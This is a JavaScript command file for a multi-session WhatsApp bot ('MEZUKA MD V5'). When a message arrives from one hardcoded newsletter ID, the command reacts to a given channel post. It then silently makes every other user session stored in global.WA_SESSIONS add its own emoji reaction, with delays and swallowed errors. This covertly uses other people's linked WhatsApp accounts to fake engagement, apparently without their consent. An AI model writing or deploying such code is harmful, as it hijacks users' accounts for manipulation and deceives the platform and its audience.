// ============================================================
// COMMAND: chr
// MEZUKA MD V5 - command/chr.js
// ============================================================

module.exports = {
    name: "chr",
    aliases: [],
    async execute({ conn, mek, m, from, sender, isOwner, isGroup, reply, quoted, q, args, body, pushname, botNumber, ownerNumber, readEnvSync, adhiqmini, GQCAP, prefix, runtime, os }) {

    if (from !== "120363424190766692@newsletter") return;

    const parts = q.split("/");
    if (parts.length < 6) return;

    const channelId = parts[4];
    const messageId = parts[5];
    if (!channelId || !messageId) return;

    const emojis = ["🎀", "❤️", "💙", "💚"];
    const getRandomEmoji = () => emojis[Math.floor(Math.random() * emojis.length)];

    try {
        const res = await conn.newsletterMetadata("invite", channelId);
        if (!res?.id) return;
        await conn.newsletterReactMessage(res.id, messageId, getRandomEmoji());
    } catch {}

    await new Promise(r => setTimeout(r, 3000));

    const allSessions = Array.from(global.WA_SESSIONS.entries());
    for (const [sessionOwner, sessionConn] of allSessions) {
        if (sessionConn === conn) continue;
        try {
            const res2 = await sessionConn.newsletterMetadata("invite", channelId);
            if (!res2?.id) continue;
            await sessionConn.newsletterReactMessage(res2.id, messageId, getRandomEmoji());
        } catch {}
        await new Promise(r => setTimeout(r, 3000));
    }

    }
};
